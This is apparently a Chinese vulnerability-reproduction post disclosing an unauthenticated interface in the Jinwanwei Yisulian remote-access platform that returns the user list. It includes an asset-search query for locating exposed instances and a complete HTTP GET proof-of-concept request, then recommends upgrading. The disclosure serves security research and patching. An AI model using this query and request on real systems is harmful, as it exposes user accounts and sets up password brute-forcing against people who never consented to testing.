#  金万维异速联平台未授权漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-05-01 05:51  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# 金万维异速联平台未授权漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS14vKVRib7QQHzv5VnW1iac8MPPS8TahT8UqNncASJRMuLGVFhczYNj3X7juHyZfIp9rYw5FGwo6knTHbZUyu9bicd51QG9hhGJQc/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS261sNzroCxehGgKIib66KZvwq57nBx0oFknVnE0SRI40ALbVtMEWpDkYvRKKm0fMVU6WNLEewiaF4F1HUTsvKCMpCl1f6Msnpvc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
金万维异速联平台是北京金万维科技有限公司推出的一款远程接入与应用交付平台，基于服务器计算架构  
开发，将应用程序的显示逻辑和计算逻辑分离，所有应用在服务器上集中安装、管理和执行，用户通过客户端访问，仅传输键盘、鼠标操作和屏幕刷新信息，大幅降低网络带宽  
需求。  
攻击者可通过访问特定接口直接获取平台用户列表，无需身份验证。这可能导致用户账号信息泄露，为后续暴力破解密码或进一步攻击提供便利。  
  
04  
  
—  
  
资产测绘  
```
title="异速联"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS1TsXibXRBlumExH2S6h4rEsdact19dt7YQwbzAaaKX6l29oShQ2UKAvtCcemejh7ykwYLxRVtjRv7oymIWTCOp7sGgwUNb1w6c/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /GNRemote.dll?GNFunction=GetUsers HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1ulC5reHZuxkFeswPIbX2GdWiaVibs9o4Tia8aCWud1rVXMKyiaSwNgL12ZeOibOG2icnMsxnryZicPkjViauGl8UKtphgsogyMmdqI00/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0hchy3z04YxFwSpZKTL4f60AEvk0Rrr9aOMhgGhZTsVq15xoHqL6ZGicgG9fY3Lqfia4G73I0uw99Zj9qlC3QSFVQcMic6nmPxRw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2IEcupLS6FmQQOs89Nq9LAAGiaeZ5RdVmoHSsSNakzEml6ibtyAJGXOUKKKlmR5onVt3Be4ibBWpuQvP3aPWapm0ic1ibjhNlpj84A/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至金万维天高（天联高级版）等安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
  
  
  
